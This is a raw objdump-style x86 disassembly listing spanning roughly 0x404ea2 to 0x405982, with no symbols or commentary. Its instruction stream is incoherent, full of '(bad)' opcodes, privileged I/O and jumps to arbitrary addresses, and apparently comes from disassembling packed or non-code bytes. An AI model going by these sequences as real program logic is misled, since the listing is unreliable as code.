  404ea2:	and    ebx,DWORD PTR [ecx+0x5fbae99b]
  404ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ea9:	jb     0x404e4a
  404eab:	pop    ebx
  404eac:	(bad)  
  404ead:	icebp  
  404eae:	fwait
  404eaf:	cli    
  404eb0:	and    ecx,ebp
  404eb2:	add    eax,DWORD PTR [eax]
	...
  404edc:	lahf   
  404edd:	push   edx
  404ede:	out    dx,al
  404edf:	xor    eax,0xfc5c51fa
  404ee4:	inc    ebx
  404ee5:	jno    0x404e95
  404ee7:	add    al,0x1c
  404ee9:	test   ax,0x2331
  404eed:	adc    ecx,esi
  404eef:	stos   DWORD PTR es:[edi],eax
  404ef0:	and    edx,DWORD PTR [ecx-0x2e]
  404ef3:	pop    ss
  404ef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ef5:	fwait
  404ef6:	in     eax,dx
  404ef7:	xchg   ebx,eax
  404ef8:	daa    
  404ef9:	sbb    edi,DWORD PTR [ebx+eax*1]
  404efc:	les    edx,FWORD PTR [eax-0x52]
  404eff:	stos   DWORD PTR es:[edi],eax
  404f00:	add    eax,DWORD PTR [ebp-0x13]
  404f03:	jle    0x404f21
  404f05:	in     al,0xe8
  404f07:	mov    esp,0x50e957de
  404f0c:	xchg   edi,eax
  404f0d:	aas    
  404f0e:	push   0xffffffc0
  404f10:	in     al,dx
  404f11:	lods   al,BYTE PTR ds:[esi]
  404f12:	mov    edx,0x135946ce
  404f17:	add    eax,0x81005d46
  404f1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f1d:	and    DWORD PTR [eax],eax
  404f1f:	jmp    0xdd3fa2be
  404f24:	and    DWORD PTR [edx+eiz*2+0x72],eax
  404f28:	loopne 0x404eef
  404f2a:	adc    BYTE PTR [ebp+ebx*2+0x4b],ah
  404f2e:	push   eax
  404f2f:	inc    ecx
  404f30:	std    
  404f31:	cmp    al,0xff
  404f33:	inc    esi
  404f34:	sbb    BYTE PTR ds:[ebp+0x39],al
  404f38:	sbb    bl,BYTE PTR [ebx-0x75]
  404f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f3c:	das    
  404f3d:	fxch   st(4)
  404f3f:	mov    DWORD PTR [eax],0x0
	...
  404f69:	add    BYTE PTR [esi+0x5f456af2],bl
  404f6f:	add    BYTE PTR [ebp-0x1abb1be4],dl
  404f75:	mov    dh,BYTE PTR [eax-0x7d]
  404f78:	mov    WORD PTR [ebx+0x50],gs
  404f7b:	je     0x404f70
  404f7d:	mov    ds:0xce908ce,al
  404f82:	push   edi
  404f83:	jmp    0x404f51
  404f85:	stos   BYTE PTR es:[edi],al
  404f86:	pusha  
  404f87:	push   DWORD PTR [edi+eax*2+0x38]
  404f8b:	ins    BYTE PTR es:[edi],dx
  404f8c:	out    0x86,al
  404f8e:	push   eax
  404f8f:	and    ecx,0xffffff86
  404f92:	mov    BYTE PTR [edx],0xc2
  404f95:	sbb    esp,edx
  404f97:	inc    esp
  404f98:	aad    0x1
  404f9a:	imul   ecx,DWORD PTR [ebp+0x53aad02c],0xffffffd1
  404fa1:	mov    al,ds:0xa2e90020
  404fa6:	push   edx
  404fa7:	push   DWORD PTR [eax+eax*1]
  404faa:	lods   eax,DWORD PTR ds:[esi]
  404fab:	call   0x9b052d
  404fb0:	(bad)  
  404fb2:	jecxz  0x404f76
  404fb4:	xor    ch,BYTE PTR [ecx+0x4ce90c1c]
  404fba:	in     al,0xeb
  404fbc:	add    BYTE PTR [esi],dh
  404fbe:	lods   al,BYTE PTR ds:[esi]
  404fbf:	cmp    DWORD PTR [ebp-0xb],0x5b
  404fc3:	jne    0x404fd0
  404fc5:	or     eax,0xb5000057
  404fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fcb:	pop    ebx
  404fcc:	leave  
	...
  404ff5:	add    BYTE PTR [edi],al
  404ff7:	dec    eax
  404ff8:	dec    DWORD PTR [edx+0xba47d0]
  404ffe:	mov    ch,0x5b
  405000:	add    BYTE PTR [edx-0x4b],ch
  405003:	add    al,0x75
  405005:	adc    BYTE PTR [edx-0x12f78afc],bh
  40500b:	jp     0x404fdb
  40500d:	add    BYTE PTR [ebp-0x26],dh
  405010:	mov    edi,0xf858697e
  405015:	sub    eax,ecx
  405017:	imul   eax,DWORD PTR [ebx+0x755b757d],0x7
  40501e:	into   
  40501f:	push   esi
  405020:	add    BYTE PTR [eax],al
  405022:	jne    0x405014
  405024:	add    ebx,ebp
  405026:	call   eax
  405028:	ret    
  405029:	pop    edi
  40502a:	jle    0x40503a
  40502c:	ret    0x350c
  40502f:	stos   BYTE PTR es:[edi],al
  405030:	mov    ebp,esp
  405032:	mov    ah,0xf
  405034:	hlt    
  405035:	inc    BYTE PTR [edx+0x1]
  405038:	push   DWORD PTR [ebp+0x41]
  40503b:	rol    BYTE PTR [ebp-0xfeac0c],cl
  405041:	(bad)  
  405042:	mov    eax,0xe2fffdfe
  405047:	push   edi
  405048:	add    BYTE PTR [eax],al
  40504a:	add    eax,0xd3fc851c
  40504f:	add    al,0xff
  405051:	add    ebp,esi
  405053:	pop    edx
  405054:	add    BYTE PTR [ebp-0xa878],cl
	...
  405082:	add    BYTE PTR [edx+0x1c087504],dl
  405088:	mov    ch,0x4
  40508a:	lea    ebx,[ecx-0x24005618]
  405090:	je     0x4050b0
  405092:	add    BYTE PTR [esi+0x44],al
  405095:	jbe    0x40501c
  405097:	enter  0xa9c6,0xff
  40509b:	ins    BYTE PTR es:[edi],dx
  40509c:	pop    edx
  40509d:	add    al,0xe8
  40509f:	sbb    eax,0x9f000486
  4050a4:	mov    esp,0x392074a9
  4050a9:	ret    
  4050aa:	jne    0x4050c4
  4050ac:	jno    0x405072
  4050ae:	jmp    0x4050d1
  4050b0:	fadd   QWORD PTR [edx]
  4050b2:	add    BYTE PTR [esp+eax*2],bl
  4050b5:	mov    edx,0x4e4414c2
  4050ba:	mov    esi,DWORD PTR [eax-0x3f]
  4050bd:	sar    ah,0xcf
  4050c0:	sub    ah,cl
  4050c2:	push   0xffffffd6
  4050c4:	ins    BYTE PTR es:[edi],dx
  4050c5:	das    
  4050c6:	or     BYTE PTR [edi+esi*4-0x57],dh
  4050ca:	jmp    DWORD PTR [ebx+0x39]
  4050cd:	ret    
  4050ce:	je     0x4050c0
  4050d0:	jmp    0x4c0a5021
  4050d5:	fwait
  4050d6:	jg     0x405123
  4050d8:	inc    ebp
  4050d9:	test   al,0xb
  4050db:	pop    esp
  4050dc:	mov    DWORD PTR ds:0x4a9e0eb,0x3ebf1d6a
  4050e6:	inc    DWORD PTR [eax]
	...
  405110:	int3   
  405111:	and    al,0x2e
  405113:	or     BYTE PTR [edx+ebp*8],dh
  405116:	mov    ch,0x0
  405118:	sbb    al,0xbf
  40511a:	ret    
  40511b:	jle    0x405169
  40511d:	leave  
  40511e:	ds adc al,0x44
  405121:	jg     0x4050cc
  405123:	jne    0x405143
  405125:	rol    DWORD PTR [edx],1
  405127:	mov    edx,DWORD PTR [ecx+0x5b]
  40512a:	cmc    
  40512b:	jl     0x40513b
  40512d:	shr    ecx,0x1d
  405130:	sbb    eax,0x4ca92be0
  405135:	dec    esi
  405136:	adc    al,0xf8
  405138:	fisubr DWORD PTR [eax+0x5f49a8d9]
  40513e:	xchg   ecx,eax
  40513f:	pop    esp
  405140:	in     al,0x4d
  405142:	jbe    0x405130
  405144:	pop    eax
  405145:	imul   edi,ebx,0x5
  405148:	(bad)  
  405149:	push   esi
  40514a:	ins    BYTE PTR es:[edi],dx
  40514b:	int3   
  40514c:	sub    bh,bh
  40514e:	jno    0x405114
  405150:	inc    edi
  405151:	and    al,0x2b
  405153:	nop    DWORD PTR [eax+0x169d9762]
  40515a:	jmp    0x9a8de50a
  40515f:	fsub   QWORD PTR [esi-0x40]
  405162:	xchg   ebx,eax
  405163:	test   al,0x9
  405165:	arpl   WORD PTR [ecx+0xb],ax
  405168:	jnp    0x4051b7
  40516a:	es cld 
  40516c:	mov    bl,0xc6
  40516e:	xchg   BYTE PTR ds:0xfb9c4dc6,bl
	...
  40519c:	add    BYTE PTR [ebx+0x60],bh
  40519f:	push   cs
  4051a0:	test   al,0x5b
  4051a2:	popa   
  4051a3:	sub    DWORD PTR [esi],ebp
  4051a5:	push   ds
  4051a6:	inc    edx
  4051a7:	xchg   esi,eax
  4051a8:	or     cl,0x6a
  4051ab:	jmp    0x778d95ab
  4051b0:	add    BYTE PTR [edx+ebx*2-0xf],dh
  4051b4:	add    ebx,DWORD PTR [edx+eax*2]
  4051b7:	jmp    0xcc04:0x436ae17a
  4051be:	fbld   TBYTE PTR [ebx+0x4]
  4051c1:	adc    al,0x4d
  4051c3:	(bad)  
  4051c4:	push   esp
  4051c5:	adc    eax,edi
  4051c7:	icebp  
  4051c8:	fwait
  4051c9:	dec    esp
  4051ca:	push   ds
  4051cb:	add    cl,ch
  4051cd:	pop    ds
  4051ce:	(bad)  
  4051cf:	mov    edi,0x2c401e30
  4051d4:	sbb    al,0x1f
  4051d6:	cwde   
  4051d7:	jmp    0x40519f
  4051d9:	dec    edi
  4051da:	loopne 0x405230
  4051dc:	in     eax,0x66
  4051de:	imul   ebp,DWORD PTR [edx-0x17],0xe984de6f
  4051e5:	xchg   DWORD PTR [edi+edi*8+0x19],ecx
  4051e9:	add    esi,0xc
  4051ec:	jbe    0x40525c
  4051ee:	imul   ebx,DWORD PTR [eax-0x40],0x5c
  4051f2:	imul   eax,DWORD PTR [ebx+0x755b0fe4],0xffffffea
  4051f9:	pop    esi
  4051fa:	inc    eax
  4051fb:	add    al,0x6c
  4051fd:	xlat   BYTE PTR ds:[ebx]
  4051fe:	(bad)  
  4051ff:	cdq    
  405200:	bound  eax,QWORD PTR [eax]
	...
  40522a:	pop    edi
  40522b:	mov    al,0xc9
  40522d:	sub    edx,DWORD PTR [esp+ecx*2-0x275b8dac]
  405234:	ret    
  405235:	xor    ebx,edx
  405237:	xchg   edi,edi
  405239:	ret    
  40523a:	pop    ds
  40523b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40523c:	call   FWORD PTR [edi+esi*2-0x3cc93bcc]
  405243:	dec    esp
  405244:	(bad)  
  405245:	lods   al,BYTE PTR ds:[esi]
  405246:	mov    ebx,0x1fe9005b
  40524b:	loopne 0x4052a1
  40524d:	icebp  
  40524e:	(bad)  
  40524f:	push   0xab77a48d
  405254:	push   0xffffffed
  405256:	les    edx,FWORD PTR [ebp-0x397d6604]
  40525c:	or     dh,ah
  40525e:	int    0x5e
  405260:	inc    edi
  405261:	push   0xe30d4ef4
  405266:	and    al,0x62
  405268:	je     0x40524d
  40526a:	sahf   
  40526b:	int    0xf8
  40526d:	add    BYTE PTR ds:0xb533c98b,al
  405273:	lock add al,0x8b
  405276:	mov    dl,0xd8
  405278:	mov    edi,0xc20e2a03
  40527d:	add    al,0x5
  40527f:	stos   DWORD PTR es:[edi],eax
  405280:	mov    ebp,esp
  405282:	jbe    0x405290
  405284:	hlt    
  405285:	push   ebx
  405286:	and    ch,BYTE PTR [edi-0x68]
  405289:	cmp    al,ch
  40528b:	push   edi
  40528c:	call   0x40537d
	...
  4052b5:	add    BYTE PTR [eax],al
  4052b7:	jp     0x4052ad
  4052b9:	dec    BYTE PTR [ecx+0x458d0300]
  4052bf:	inc    ecx
  4052c0:	test   al,0xe8
  4052c2:	sub    DWORD PTR [edx+0x5e33fef4],edx
  4052c8:	jb     0x4052e8
  4052ca:	push   0xffffffaf
  4052cc:	outs   dx,DWORD PTR ds:[esi]
  4052cd:	add    dl,bh
  4052cf:	mov    ch,0x57
  4052d1:	push   DWORD PTR [ebp-0xf]
  4052d4:	hlt    
  4052d5:	je     0x4052df
  4052d7:	in     eax,dx
  4052d8:	retf   
  4052d9:	(bad)  
  4052da:	dec    DWORD PTR [edx-0x25]
  4052dd:	mov    edi,0x47f10f
  4052e2:	add    BYTE PTR [ebp+0xdf474f4],al
  4052e8:	jne    0x4052c1
  4052ea:	dec    DWORD PTR [edx]
  4052ec:	inc    ebx
  4052ed:	(bad)  
  4052ee:	stc    
  4052ef:	jne    0x405348
  4052f1:	jbe    0x4052f8
  4052f3:	sbb    al,0x54
  4052f5:	add    DWORD PTR [eax],eax
  4052f7:	inc    ebp
  4052f8:	hlt    
  4052f9:	je     0x4052ef
  4052fb:	sub    eax,0x4affffa2
  405300:	retf   
  405301:	shl    BYTE PTR [ecx+eax*1-0xb],0x74
  405306:	hlt    
  405307:	dec    ebp
  405308:	rcr    cl,cl
  40530a:	dec    DWORD PTR [edx-0x2f]
  40530d:	push   ebp
  40530e:	hlt    
  40530f:	sbb    al,0xb9
  405311:	adc    ch,BYTE PTR [edx+0x1c]
  405314:	pushf  
  405315:	lock and BYTE PTR [esp+esi*1],bl
  405319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40531a:	jne    0x40531c
	...
  405344:	or     BYTE PTR [edx],cl
  405346:	das    
  405347:	hlt    
  405348:	add    esp,DWORD PTR [edi-0x8]
  40534b:	(bad)  
  40534c:	popa   
  40534d:	or     al,0x4
  40534f:	add    BYTE PTR [esp+esi*1],bl
  405352:	sbb    eax,DWORD PTR [esi+0x5b]
  405355:	jae    0x40535b
  405357:	jmp    FWORD PTR [ecx-0x10]
  40535a:	fwait
  40535b:	into   
  40535c:	out    0x34,eax
  40535e:	add    edx,DWORD PTR [ebx+0x27]
  405361:	hlt    
  405362:	das    
  405363:	ss xchg edi,eax
  405365:	fcomp  QWORD PTR [ebx]
  405367:	inc    esi
  405368:	push   ebx
  405369:	jae    0x40536f
  40536b:	call   0x44518b
  405370:	pop    ds
  405371:	mov    esp,0x8997474d
  405376:	imul   edx,DWORD PTR [ebp+ecx*1+0x29b00334],0xffffffa6
  40537e:	push   esi
  40537f:	mov    eax,0x323a8
  405384:	aaa    
  405385:	jae    0x405345
  405387:	inc    edi
  405388:	xor    DWORD PTR [esp+ecx*2],0x53
  40538c:	test   ah,bl
  40538e:	mov    eax,0x3fcb1c00
  405393:	clc    
  405394:	retf   
  405395:	cmp    DWORD PTR ds:0x481111ff,0x41e8f268
  40539f:	add    BYTE PTR [ebx-0x39],dl
  4053a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053a3:	call   0x44e149
	...
  4053d0:	add    bh,ch
  4053d2:	cmp    al,0xc3
  4053d4:	je     0x4053b6
  4053d6:	mov    esp,0x5aca68ac
  4053db:	ss inc ebx
  4053dd:	sbb    al,0x33
  4053df:	mov    bh,0xba
  4053e1:	sbb    al,0x5b
  4053e3:	jmp    0xd5c4:0x62a273ab
  4053ea:	out    dx,al
  4053eb:	xlat   BYTE PTR ds:[ebx]
  4053ec:	add    ebx,DWORD PTR [ebx+ecx*1]
  4053ef:	in     al,dx
  4053f0:	mov    cl,0xb2
  4053f2:	add    bl,BYTE PTR [ebp+0x12]
  4053f5:	sbb    al,0x5b
  4053f7:	add    al,bl
  4053f9:	fisub  DWORD PTR [ecx-0x51acfc5a]
  4053ff:	xchg   ecx,eax
  405400:	pusha  
  405401:	repnz dec ecx
  405403:	xchg   esi,eax
  405404:	js     0x405477
  405406:	imul   esp,edx,0xffffffd1
  405409:	dec    eax
  40540a:	pop    edi
  40540b:	jo     0x40540e
  40540d:	mov    bh,0x60
  40540f:	sbb    DWORD PTR [edx+edx*8+0x5ba47628],ebx
  405416:	and    DWORD PTR [esi],esp
  405418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405419:	and    DWORD PTR [edx+0x4f31a4c2],ebp
  40541f:	push   ecx
  405420:	fcmovnb st,st(4)
  405422:	dec    ecx
  405423:	push   esi
  405424:	sbb    BYTE PTR [ecx],0x43
  405427:	jmp    0xac626f58
  40542c:	stos   DWORD PTR es:[edi],eax
  40542d:	sbb    al,0x5b
  40542f:	mov    DWORD PTR [ebx],eax
  405431:	or     edi,0x31
  405434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  40545d:	add    cl,dh
  40545f:	dec    esi
  405460:	cs cs and al,0x33
  405464:	push   cs
  405465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405466:	imul   ecx,DWORD PTR [ecx+0x1e],0x2e
  40546a:	push   0x5bcd9132
  40546f:	dec    ecx
  405470:	loop   0x405435
  405472:	leave  
  405473:	pop    esp
  405474:	adc    cl,BYTE PTR [eax]
  405476:	pop    ss
  405477:	sbb    esi,DWORD PTR [ebp+0xc]
  40547a:	xchg   edi,eax
  40547b:	scas   eax,DWORD PTR es:[edi]
  40547c:	add    ch,bh
  40547e:	mov    bl,0x6c
  405480:	push   DWORD PTR [ebx+ebp*1+0x48]
  405484:	jne    0x405463
  405486:	jg     0x405434
  405488:	xor    al,0x64
  40548a:	pop    eax
  40548b:	ret    0x9205
  40548e:	and    DWORD PTR [ebx+0x0],ebx
  405491:	jmp    0x73350338
  405496:	adc    cl,BYTE PTR [edx+0x75]
  405499:	mov    ch,0xbf
  40549b:	lods   eax,DWORD PTR ds:[esi]
  40549c:	or     BYTE PTR [esi+0x41e84715],dh
  4054a2:	fimul  WORD PTR [eax-0x1]
  4054a5:	jb     0x40548a
  4054a7:	test   al,0x5b
  4054a9:	mov    al,0xda
  4054ab:	push   edi
  4054ac:	add    BYTE PTR [ebx+ebp*4],bh
  4054af:	aaa    
  4054b0:	and    DWORD PTR [ebp-0x2dac4f98],0xffffff8a
  4054b7:	mov    bl,0x0
  4054b9:	leave  
  4054ba:	pop    ds
  4054bb:	pop    ebx
  4054bc:	call   0xff8932cb
  4054c1:	pusha  
	...
  4054ea:	add    BYTE PTR [ebp+0x47],ah
  4054ed:	push   0xff48bfe9
  4054f2:	push   ecx
  4054f3:	out    0x28,al
  4054f5:	call   DWORD PTR [esi-0x57]
  4054f8:	sahf   
  4054f9:	mov    ah,0xc1
  4054fb:	pop    ds
  4054fc:	jnp    0x4054fe
  4054fe:	jmp    0x3f1ee7ba
  405503:	mov    edi,0x8d7544d2
  405508:	mov    al,0x70
  40550b:	jl     0x405555
  40550d:	(bad)  
  40550e:	jmp    0x54335d65
  405513:	push   edi
  405514:	sahf   
  405515:	rcl    ch,0x1f
  405518:	pop    ebx
  405519:	add    BYTE PTR [esi],ah
  40551b:	in     eax,0x2e
  40551d:	inc    DWORD PTR [eax]
  40551f:	inc    edx
  405520:	pop    esp
  405521:	add    bh,al
  405523:	js     0x405511
  405525:	(bad)  
  405526:	pop    ds
  405527:	inc    ebp
  405528:	pop    esp
  405529:	push   DWORD PTR [ebp+0x41]
  40552c:	in     eax,dx
  40552d:	inc    esp
  40552e:	rol    BYTE PTR [edx+0x63],1
  405531:	mov    ah,0x8f
  405533:	clc    
  405534:	or     cl,BYTE PTR [ebp+0x688bc545]
  40553a:	add    BYTE PTR ds:0xf56a805c,al
  405540:	cld    
  405541:	je     0x40554b
  405543:	in     eax,dx
  405544:	test   dl,cl
  405546:	add    BYTE PTR ds:0xfb74c059,al
  40554c:	loopne 0x4055ca
  40554e:	rol    BYTE PTR [eax],1
	...
  405578:	cmc    
  405579:	bound  eax,QWORD PTR ds:0x5bb3e9
  40557f:	add    BYTE PTR [edx-0x3d004f6e],cl
  405585:	pop    ebx
  405586:	add    BYTE PTR [ebp-0xaf5108],cl
  40558c:	enter  0x68a7,0x0
  405590:	lds    ebx,FWORD PTR [ebx-0x80]
  405593:	(bad)  
  405594:	clc    
  405595:	push   ds
  405596:	push   eax
  405597:	call   0x406ea3
  40559c:	scas   al,BYTE PTR es:[edi]
  40559d:	sbb    esi,DWORD PTR [ebp+0x5]
  4055a0:	fdiv   QWORD PTR [esi-0x277b0000]
  4055a6:	inc    esp
  4055a7:	mov    ah,0x3b
  4055a9:	pop    esp
  4055aa:	add    BYTE PTR [ebp+0x3cb91bc0],cl
  4055b0:	test   DWORD PTR [ebx+0x0],ebx
  4055b3:	xor    eax,DWORD PTR [ebp-0xf]
  4055b6:	test   eax,0x3c1bb8c7
  4055bb:	add    BYTE PTR [ebp+0x5b],dh
  4055be:	push   DWORD PTR [ebp+0x1c]
  4055c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055c2:	xchg   edx,eax
  4055c3:	inc    ebp
  4055c4:	inc    eax
  4055c5:	or     BYTE PTR [eax-0x2c],0x4b
  4055c9:	inc    eax
  4055ca:	add    eax,DWORD PTR [eax]
  4055cc:	pop    ebx
  4055cd:	(bad)  
  4055ce:	xchg   edx,eax
  4055cf:	call   FWORD PTR [ebx]
  4055d1:	xor    al,BYTE PTR [ebx]
  4055d3:	(bad)  
  4055d4:	fnstenv [ecx+0x33]
  4055d7:	push   0x1c
  4055d9:	lods   al,BYTE PTR ds:[esi]
  4055da:	add    al,0xff
	...
  405604:	add    BYTE PTR [ecx-0x1a19541b],ch
  40560a:	xor    al,0x3
  40560c:	or     ebx,esp
  40560e:	mov    al,0xa
  405610:	or     DWORD PTR [ecx+0x1e7503e4],0x29
  405617:	and    al,0xff
  405619:	jno    0x40562b
  40561b:	mov    eax,ds:0x249ca875
  405620:	dec    edi
  405621:	pop    ebp
  405622:	xor    al,0xa0
  405624:	jne    0x4055c6
  405626:	in     al,dx
  405627:	sbb    cl,cl
  405629:	sbb    al,0x34
  40562b:	test   ah,al
  40562d:	sub    al,0x25
  40562f:	pop    eax
  405630:	inc    ebp
  405631:	in     al,0x64
  405633:	cs add bl,al
  405636:	dec    edi
  405637:	lahf   
  405638:	call   0xffe22107
  40563d:	daa    
  40563e:	hlt    
  40563f:	push   ss
  405640:	add    dh,BYTE PTR [edi+0x64458b67]
  405646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405647:	pop    ss
  405648:	mov    esp,0xcb4284
  40564d:	sbb    al,0x4
  40564f:	mov    al,ds:0x179dc875
  405654:	mov    eax,0xff9bef74
  405659:	jnp    0x405694
  40565b:	ret    
  40565c:	jne    0x40567c
  40565e:	cdq    
  40565f:	hlt    
  405660:	(bad)  
  405661:	icebp  
  405662:	pop    edx
  405663:	stc    
  405664:	mov    al,ds:0x171e56e9
	...
  405691:	add    BYTE PTR [ebx+esi*1+0x46539edc],dl
  405698:	bound  edi,QWORD PTR [ebx+ecx*2+0x5eac41d0]
  40569f:	adc    al,0xe9
  4056a1:	add    edi,DWORD PTR [ebx]
  4056a3:	sar    BYTE PTR ds:0xee2826ac,1
  4056a9:	mov    al,ds:0xaba5d02b
  4056ae:	push   ds
  4056af:	sub    dh,bl
  4056b1:	mov    al,ds:0xabd5d01b
  4056b6:	push   ss
  4056b7:	daa    
  4056b8:	into   
  4056b9:	mov    al,ds:0x41221997
  4056be:	aad    0x18
  4056c0:	in     eax,dx
  4056c1:	add    edx,DWORD PTR [ecx-0x2e]
  4056c4:	les    eax,FWORD PTR [eax+ebx*8+0x18466246]
  4056cb:	push   edx
  4056cc:	test   eax,0xe91e1a17
  4056d1:	add    ebx,DWORD PTR [ebx+ebx*2]
  4056d4:	jmp    0xe987b0a1
  4056d9:	add    ebx,DWORD PTR [ebx+ebx*2]
  4056dc:	je     0x405724
  4056de:	shr    BYTE PTR [edx+0x4628167e],0xfc
  4056e5:	or     eax,esp
  4056e7:	mov    bl,0x6f
  4056e9:	mov    al,ds:0x9fe3d9ab
  4056ee:	sbb    al,0xcf
  4056f0:	imul   BYTE PTR ds:0xfdc461c
	...
  40571e:	add    BYTE PTR [ebx-0xd54b231],dl
  405724:	inc    esp
  405725:	inc    esi
  405726:	mov    al,ds:0x9fb445ec
  40572b:	test   bh,dh
  40572d:	call   DWORD PTR [esp+edi*4]
  405730:	inc    ebp
  405731:	pop    eax
  405732:	and    BYTE PTR [ecx+0x52],ah
  405735:	add    BYTE PTR [eax+edx*4-0x44da7cca],bh
  40573c:	mov    esp,0x5bb3acc7
  405741:	add    BYTE PTR [edi-0x180160ac],al
  405747:	pop    ds
  405748:	mov    cl,0x4
  40574a:	ins    BYTE PTR es:[edi],dx
  40574b:	loop   0x405793
  40574d:	push   eax
  40574e:	sbb    DWORD PTR [edi-0x816ffa6],0x1fe9ff45
  405758:	inc    esi
  405759:	jne    0x40574c
  40575b:	(bad)  
  40575c:	popf   
  40575d:	leave  
  40575e:	jmp    0xe6026982
  405763:	pop    ds
  405764:	scas   al,BYTE PTR es:[edi]
  405765:	mov    edx,ebp
  405767:	lahf   
  405768:	pop    ds
  405769:	lods   al,BYTE PTR ds:[esi]
  40576a:	push   ss
  40576b:	das    
  40576c:	sbb    al,0x45
  40576e:	test   DWORD PTR [eax],ebx
  405770:	pop    ebx
  405771:	add    cl,ch
  405773:	into   
  405774:	and    DWORD PTR [eax-0x17],ebp
  405777:	out    dx,eax
  405778:	inc    esp
  405779:	call   DWORD PTR [ecx-0x6900d8ce]
  40577f:	mov    eax,ds:0x1c09e
	...
  4057ac:	and    BYTE PTR [ebx+0x0],ch
  4057af:	jmp    0x7f1d0a2b
  4057b4:	fwait
  4057b5:	rol    BYTE PTR [ecx+esi*1+0x0],cl
  4057b9:	pop    ebx
  4057ba:	adc    cl,ch
  4057bc:	pop    ds
  4057bd:	xor    ebx,DWORD PTR [ebp+eax*2-0x7d]
  4057c1:	inc    esp
  4057c2:	mov    DWORD PTR [ebx+edi*8-0xed2832b],esp
  4057c9:	xchg   BYTE PTR [eax],al
  4057cb:	jmp    0x100dfef
  4057d0:	inc    esi
  4057d1:	mov    cl,0xc7
  4057d3:	inc    ebp
  4057d4:	inc    ecx
  4057d5:	cmp    edi,edi
  4057d7:	inc    DWORD PTR [ebp-0x353f8b1b]
  4057dd:	xchg   ecx,eax
  4057de:	aam    0xff
  4057e0:	and    BYTE PTR [eax+0x1c35458f],0x45
  4057e7:	fsubr  DWORD PTR [edx]
  4057e9:	push   esp
  4057ea:	add    BYTE PTR [eax],al
  4057ec:	add    dl,BYTE PTR [edx+0x584afff4]
  4057f2:	add    BYTE PTR [ebp+0x68501c80],cl
  4057f8:	inc    ebp
  4057f9:	pop    eax
  4057fa:	add    BYTE PTR [eax+0x75ff589f],al
  405800:	sub    eax,0x5c869f0
  405805:	pop    eax
  405806:	or     eax,eax
  405808:	jno    0x405867
  40580a:	cmp    DWORD PTR [ebp-0x2f],0x57
  40580e:	jne    0x405815
	...
  405838:	add    ah,ch
  40583a:	cli    
  40583b:	(bad)  
  40583c:	inc    DWORD PTR ds:0xaab0451d
  405842:	push   esp
  405843:	add    BYTE PTR [eax],al
  405845:	dec    eax
  405846:	xchg   ebx,eax
  405847:	mov    al,0x50
  405849:	mov    edx,0xc568bc62
  40584e:	push   edi
  40584f:	add    BYTE PTR [eax+0x50c49338],al
  405855:	popf   
  405856:	xchg   edx,eax
  405857:	enter  0xb500,0x50
  40585b:	shl    BYTE PTR [ebp-0x40],0xf6
  40585f:	xlat   BYTE PTR ds:[ebx]
  405860:	add    ch,al
  405862:	push   edi
  405863:	mov    eax,DWORD PTR [ebp-0x13]
  405866:	sbb    eax,0x7b280000
  40586b:	les    edi,FWORD PTR [ecx+0x5f39]
  405871:	sbb    al,0x61
  405873:	(bad)  
  405874:	repz mov dh,0x7c
  405877:	dec    eax
  405878:	les    eax,FWORD PTR [eax+0x32]
  40587b:	add    eax,DWORD PTR [eax]
  40587d:	jnp    0x40588d
  40587f:	pop    ebx
  405880:	(bad)  
  405881:	fld    DWORD PTR [ecx+0x744445c6]
  405887:	push   cs
  405888:	add    BYTE PTR [esi*2+0x345bf448],bl
  40588f:	add    eax,DWORD PTR [eax]
  405891:	mov    eax,ds:0xb650c6f6
  405896:	xor    DWORD PTR [ecx],ebp
  405898:	add    BYTE PTR [ebx-0x3a],al
  40589b:	pop    edi
  40589c:	call   0x4058a1
	...
  4058c5:	add    BYTE PTR ds:0x2700037c,dh
  4058cb:	jb     0x4058e4
  4058cd:	push   es
  4058ce:	lahf   
  4058cf:	mov    dh,0xb7
  4058d1:	add    BYTE PTR [ecx+0x1c8caa36],ch
  4058d7:	xor    al,0x3
  4058d9:	dec    DWORD PTR [ecx-0x238a63bc]
  4058df:	adc    DWORD PTR [edi],edx
  4058e1:	mov    eax,0x414e6674
  4058e6:	sbb    al,0x1
  4058e8:	pop    ss
  4058e9:	mov    esp,0xc5b304
  4058ee:	sbb    al,0xb5
  4058f0:	enter  0x1314,0xa1
  4058f4:	inc    edi
  4058f5:	fsubr  QWORD PTR [esi+ebp*2+0x4]
  4058f9:	dec    DWORD PTR [ecx-0xc]
  4058fc:	stos   DWORD PTR es:[edi],eax
  4058fd:	sti    
  4058fe:	(bad)  
  4058ff:	rcr    DWORD PTR [ebx+ecx*1-0x14fec024],1
  405906:	pop    edx
  405907:	retf   
  405908:	inc    edi
  405909:	mov    ah,0xb3
  40590b:	aas    
  40590c:	push   edi
  40590d:	call   0xffde0b8f
  405912:	mov    ds:0x845fdc5b,eax
  405917:	push   0x27
  405919:	add    al,0x1c
  40591b:	stos   DWORD PTR es:[edi],eax
  40591c:	push   esi
  40591d:	pop    ss
  40591e:	enter  0xd442,0x57
  405922:	je     0x4058c9
  405924:	inc    eax
  405925:	popf   
  405926:	jnp    0x40597e
  405928:	sub    DWORD PTR [edi],edx
	...
  405952:	add    BYTE PTR [esi],bl
  405954:	ss clc 
  405956:	sub    cl,0x6a
  405959:	jmp    0x9c826175
  40595e:	repz pop edx
  405960:	enter  0x9ced,0xc9
  405964:	push   es
  405965:	add    DWORD PTR [ebp+eax*2+0x42],eax
  405969:	push   cs
  40596a:	or     DWORD PTR [eax+ecx*8-0x15],ebx
  40596e:	test   al,0x13
  405970:	(bad)  
  405971:	and    BYTE PTR [ecx],cl
  405973:	push   edi
  405974:	(bad)  
  405975:	fmul   DWORD PTR [esi-0x6367111f]
  40597b:	test   eax,0xd016e666
  405980:	xor    al,BYTE PTR [eax]
  405982:	cdq    
